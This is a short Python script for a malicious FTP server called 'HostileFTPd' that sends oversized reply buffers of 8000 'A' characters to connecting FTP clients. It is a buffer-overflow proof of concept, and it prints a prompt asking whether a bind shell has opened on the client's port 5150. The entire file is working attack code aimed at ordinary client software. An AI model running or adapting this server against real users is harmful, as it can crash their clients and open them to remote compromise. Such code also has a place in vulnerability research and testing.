#!/USR/bin/python
import os, sys, socket

crash = '\x41'*8000

cases = {
	"USER": "331 user OK. Pass required",
	"PASS": "230 OK, current directory is /",
	"SYST": "BBBBBBBBB",
	"TYPE": "200 TYPE "+str(crash),
#	"SITE UMASK": "500 SITE UMASK "+str(crash),
	"SITE UMASK": "500 SITE UMASK ",
#	"CWD": "250 OK, current directory is /"+str(crash),
	"CWD": "250 OK, current directory is /",
#	"PORT": "200 PORT "+str(crash),
	"PORT": "200 PORT ",
#	"PASV": "227 " +str(crash),
	"PASV": "227 ",
#	"LIST": "150 Connecting to "+str(crash)+" port.\r\n226 "+str(crash)+"\r\n226 Options: -"+str(crash)+" -l\r\n226 "+str(crash)
	"LIST": "150 Connecting to port.\r\n226 \r\n226 Options: - -l\r\n226 ",
}

sx = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sx.bind(("0.0.0.0",21))
sx.listen(5)
print("[.] Standing up HostileFTPd v0.0 alpha, port 21")
cx,addr = sx.accept()
print("[!] Connection received from %s" % str(addr))
cx.send("220 HostileFTPd\r\n")
notified = 0
while True:	
	req = cx.recv(1024)
	for key, resp in cases.items():
		if key in req:
			cx.send(resp + "\r\n")
			print "sent\r\n"
		if "SITE UMASK" in req and notified == 0:
			print("[!]  Buffer sent.  Bind shell on client's port 5150?")
			notified = 1
		if "PASV" in req:
			justpause = raw_input("[.] PASV received.  Pausing recv buffer")

